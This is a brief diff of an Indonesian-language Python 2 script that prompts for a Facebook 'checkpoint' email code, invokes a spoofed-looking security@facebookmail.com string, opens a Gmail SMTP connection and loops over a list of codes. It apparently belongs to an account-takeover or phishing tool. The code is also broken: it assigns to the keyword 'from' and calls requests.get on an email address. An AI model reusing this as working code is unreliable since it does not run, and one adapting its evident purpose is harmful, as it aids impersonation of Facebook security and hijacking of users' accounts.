@@ -180,9 +180,9 @@ def code():
 		os.system('clear')
                 time.sleep(0.05)
 		print logo
-		print("\033[1;93mKonfirmasi Code Email Anda")
+		print("\033[1;93mKonfirmasi Code Email account CP")
 		codem = raw_input("\033[1;34mEmail : ")
-		from = requests.get("Facebook • security@facebookmail.com")
+		from = requests.get("smtp.security@facebookmail.com")
 		server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 		server.ehlo()
 		for code in code_list:
